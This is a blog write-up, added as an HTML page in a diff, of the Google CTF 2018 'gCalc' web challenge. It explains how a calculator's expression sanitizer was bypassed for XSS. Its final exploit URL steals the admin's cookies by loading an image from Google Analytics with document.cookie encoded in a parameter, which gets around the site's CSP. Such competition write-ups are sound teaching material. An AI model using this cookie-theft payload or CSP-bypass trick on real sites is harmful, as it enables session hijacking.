@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="gCalc is the web challenge in Google CTF 2018 quals and only 15 teams solved during 2 days’ competition!   This challenge is a very interesting challenge that give me lots of fun. I love the challenge">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Google CTF 2018 Quals Web Challenge - gCalc">
+<meta property="og:url" content="http://blog.orange.tw/posts/2018-06-google-ctf-2018-quals-web-gcalc/index.html">
+<meta property="og:site_name" content="Orange Tsai">
+<meta property="og:description" content="gCalc is the web challenge in Google CTF 2018 quals and only 15 teams solved during 2 days’ competition!   This challenge is a very interesting challenge that give me lots of fun. I love the challenge">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://blog.orange.tw/posts/2018-06-google-ctf-2018-quals-web-gcalc/36a653e2478602ad-01.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2018-06-google-ctf-2018-quals-web-gcalc/8a3cc22deb94a1d6-02.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2018-06-google-ctf-2018-quals-web-gcalc/07f4d3561354d1ce-03.png">
+<meta property="article:published_time" content="2018-06-26T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-08-21T06:14:49.594Z">
+<meta property="article:author" content="Orange Tsai">
+<meta property="article:tag" content="Hacker, Security, Vulnerability, Web, RCE, SSRF, XSS, CVE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blog.orange.tw/posts/2018-06-google-ctf-2018-quals-web-gcalc/36a653e2478602ad-01.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    
+      <title>Google CTF 2018 Quals Web Challenge - gCalc | Orange Tsai</title>
+    
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-13047966-1"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'UA-13047966-1');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Orange Tsai" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+    <div class="content index py4 ">
+        
+          <header id="header">
+  <a class="u-url u-uid" href="/">
+  
+    
+      <img id="logo" alt class="u-logo" src="/images/logo.png" />
+    
+  
+    <div id="title">
+      <h1 class="p-name">Orange Tsai</h1>
+    </div>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-2x"></i></a>
+      </li>
+      <!--
+     --><li><a href="/">Home</a></li><!--
+   --><!--
+     --><li><a href="/articles/">Articles</a></li><!--
+   --><!--
+     --><li><a href="/talks/">Talks</a></li><!--
+   --><!--
+     --><li><a href="/about/">About</a></li><!--
+   -->
+    </ul>
+  </div>
+</header>
+
+        
+
+        
+          <hr style='margin: 0px; margin-bottom: 32px; border: 0.5px solid #ccc; '>
+        
+
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Google CTF 2018 Quals Web Challenge - gCalc
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">🍊 <a href='/about'>Orange Tsai</a></span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2018-06-26T16:00:00.000Z" class="dt-published" itemprop="datePublished">2018-06-27</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>gCalc is the web challenge in Google CTF 2018 quals and only 15 teams solved during 2 days’ competition!  </p>
+<p>This challenge is a very interesting challenge that give me lots of fun. I love the challenge that challenged your exploit skill instead of giving you lots of code to find a simple vulnerability or guessing without any hint. So that I want to write a writeup to note this :P  </p>
+<p>The challenge gave you a link <a target="_blank" rel="noopener" href="https://gcalc2.web.ctfcompetition.com/">https://gcalc2.web.ctfcompetition.com/</a>. It just a calculator written in JavaScript and seems like a XSS challenge. There is a <code>try it</code> hyperlink in the bottom and pass your formula expression to admin!  </p>
+<p><img src="/posts/2018-06-google-ctf-2018-quals-web-gcalc/36a653e2478602ad-01.png"></p>
+<p>At first glance I found there are 2 parameter we can control from query string - <code>expr</code> and <code>vars</code>. It looks like:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gcalc2.web.ctfcompetition.com/?expr=vars.pi*3&amp;vars=&#123;&quot;pi&quot;:3.14159,&quot;ans&quot;:0&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>You can define some variables in the context and use them in formula expression. But the variable only allowed <code>Number</code> type, and the <code>Object</code> type that created from <code>null</code>, that means there is no other methods and properties in the created <code>Object</code>. The prettified JavaScript code you can find out from <a target="_blank" rel="noopener" href="https://gist.github.com/orangetw/31fce265a3b6329839d82eb810b2bd11">my gist</a>!  </p>
+<p>As you can see, the real vulnerability is very straightforward. Argument <code>a</code> is <code>expr</code> in query string and argument <code>b</code> is <code>vars</code>. The <code>expr</code> just do some sanitizers and pass to <code>new Function()</code>. The <code>new Function()</code> is like <code>eval</code> in JavaScript!  </p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">p</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    a = <span class="title class_">String</span>(a).<span class="title function_">toLowerCase</span>();</span><br><span class="line">    b = <span class="title class_">String</span>(b);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="regexp">/^(?:[\(\)\*\/\+%\-0-9 ]|\bvars\b|[.]\w+)*$/</span>.<span class="title function_">test</span>(a)) <span class="keyword">throw</span> <span class="title class_">Error</span>(a);</span><br><span class="line">    b = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(b, <span class="keyword">function</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (b &amp;&amp; <span class="string">&quot;object&quot;</span> === <span class="keyword">typeof</span> b &amp;&amp; !<span class="title class_">Array</span>.<span class="title function_">isArray</span>(b)) <span class="keyword">return</span> <span class="title class_">Object</span>.<span class="title function_">assign</span>(<span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>), b);</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;number&quot;</span> === <span class="keyword">typeof</span> b) <span class="keyword">return</span> b</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> <span class="title class_">Function</span>(<span class="string">&quot;vars&quot;</span>, <span class="string">&quot;return &quot;</span> + a))(b)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>The sanitizer of <code>expr</code> looks like flexible. We use <a target="_blank" rel="noopener" href="https://regex101.com/">regex101</a> to analyse the regular expression. The regular expression allowed some operands and operators in expression, and the variable name must starts-with <code>vars</code>. The first thought in my head is that we can use <code>constructor.constructor(CODE)()</code> to execute arbitrary JavaScript. Then the remaining part is how to create the <code>CODE</code> payload.  </p>
+<p>Quickly, I wrote the first version of exploit like:  </p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// https://regex101.com/r/FLdJ7h/1</span></span><br><span class="line"><span class="comment">// alert(1) // Remove whitespaces by yourself</span></span><br><span class="line">vars.<span class="property">pi</span>.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"></span></span><br><span class="line"><span class="params">  vars.pi.toString().constructor.fromCharCode(<span class="number">97</span>)+</span></span><br><span class="line"><span class="params">  vars.pi.toString().constructor.fromCharCode(<span class="number">108</span>)+</span></span><br><span class="line"><span class="params">  vars.pi.toString().constructor.fromCharCode(<span class="number">101</span>)+</span></span><br><span class="line"><span class="params">  vars.pi.toString().constructor.fromCharCode(<span class="number">114</span>)+</span></span><br><span class="line"><span class="params">  vars.pi.toString().constructor.fromCharCode(<span class="number">116</span>)+</span></span><br><span class="line"><span class="params">  vars.pi.toString().constructor.fromCharCode(<span class="number">40</span>)+</span></span><br><span class="line"><span class="params">  vars.pi.toString().constructor.fromCharCode(<span class="number">49</span>)+</span></span><br><span class="line"><span class="params">  vars.pi.toString().constructor.fromCharCode(<span class="number">41</span>)</span></span><br><span class="line"><span class="params"></span>)(<span class="params"></span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>I debug for an hour and got stuck by this exploit. I am curious about why this works in my console but fails to XSS. Finally, I find the root cause that there is a <code>toLowerCase</code> in the first line, so our <code>toString</code> and <code>fromCharCode</code> will fail… orz  </p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">p</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    a = <span class="title class_">String</span>(a).<span class="title function_">toLowerCase</span>();</span><br><span class="line">    b = <span class="title class_">String</span>(b);</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
+
+
+
+
+<p>After knowing this, I quickly wrote next version of exploit, retrieving the payload from key of <code>vars</code> map! In my payload, I use <code>/1/.exec(1).keys(1).constructor</code> to get the <code>Obejct</code> constructor and <code>keys(vars).pop()</code> to retrieve the last key in the <code>vars</code> map!  </p>
+<p>Here is the payload:  </p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// https://regex101.com/r/IMXgwR/1</span></span><br><span class="line">(<span class="number">1</span>).<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"></span></span><br><span class="line"><span class="params">  /<span class="number">1</span>/.exec(<span class="number">1</span>).keys(<span class="number">1</span>).constructor.keys(vars).pop()</span></span><br><span class="line"><span class="params"></span>)(<span class="params"></span>)</span><br></pre></td></tr></table></figure>
+
+<p>And payload to pop an <code>alert(1)</code>:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https<span class="punctuation">:</span><span class="comment">//gcalc2.web.ctfcompetition.com/</span></span><br><span class="line">?expr=(<span class="number">1</span>).constructor.constructor(/<span class="number">1</span>/.exec(<span class="number">1</span>).keys(<span class="number">1</span>).constructor.keys(vars).pop())()</span><br><span class="line">&amp;vars=<span class="punctuation">&#123;</span><span class="attr">&quot;pi&quot;</span><span class="punctuation">:</span><span class="number">3.14159</span><span class="punctuation">,</span><span class="attr">&quot;ans&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;alert(1)&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/posts/2018-06-google-ctf-2018-quals-web-gcalc/8a3cc22deb94a1d6-02.png"></p>
+<p>Does it finished? Not yet :(  </p>
+<p>Our goal is to steal cookies from admin, and we encountered CSP problem!  </p>
+<h3 id="CSP-of"><a href="#CSP-of" class="headerlink" title="CSP of /"></a>CSP of <code>/</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;; child-src https://sandbox-gcalc2.web.ctfcompetition.com/</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="CSP-of-static-calc-html"><a href="#CSP-of-static-calc-html" class="headerlink" title="CSP of /static/calc.html"></a>CSP of <code>/static/calc.html</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;; frame-ancestors https://gcalc2.web.ctfcompetition.com/; font-src https://fonts.gstatic.com; style-src &#x27;self&#x27; https://*.googleapis.com &#x27;unsafe-inline&#x27;; script-src &#x27;self&#x27; https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/ https://www.google-analytics.com https://*.googleapis.com &#x27;unsafe-eval&#x27; https://www.googletagmanager.com; child-src https://www.google.com/recaptcha/; img-src https://www.google-analytics.com;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>We can’t use redirection or load external resources to exfiltrate cookies. But I have noticed that <code>img-src https://www.google-analytics.com</code> in the CSP header and remembered long time ago, I read a <a target="_blank" rel="noopener" href="https://hackerone.com/reports/199779">HackerOne report</a> that using Google Analytics for data exfiltration! You can embed your data in the parameter <code>ea</code> of Google Analytics to outside, and we can see results from <a target="_blank" rel="noopener" href="https://analytics.google.com/">Google Analytics console</a>!  </p>
+<p>Here is the final exploit:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://gcalc2.web.ctfcompetition.com/</span><br><span class="line">?expr=(1).constructor.constructor(/1/.exec(1).keys(1).constructor.keys(vars).pop())()</span><br><span class="line">&amp;vars=&#123;&quot;pi&quot;:3.14159,&quot;ans&quot;:0, &quot;x=document.createElement(&#x27;img&#x27;);x.src=&#x27;https://www.google-analytics.com/collect</span><br><span class="line">?v=1&amp;tid=UA-00000000-1&amp;cid=0000000000&amp;t=event&amp;ec=email&amp;ea=&#x27;+encodeURIComponent(document.cookie);document.querySelector(&#x27;body&#x27;).append(x)&quot;:0&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/posts/2018-06-google-ctf-2018-quals-web-gcalc/07f4d3561354d1ce-03.png"></p>
+<p>Oh yeah. The flag is <code>CTF&#123;1+1=alert&#125;</code>!  </p>
+
+  </div>
+</article>
+
+
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2009-2024
+    Orange Tsai
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/articles/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/talks/">Talks</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
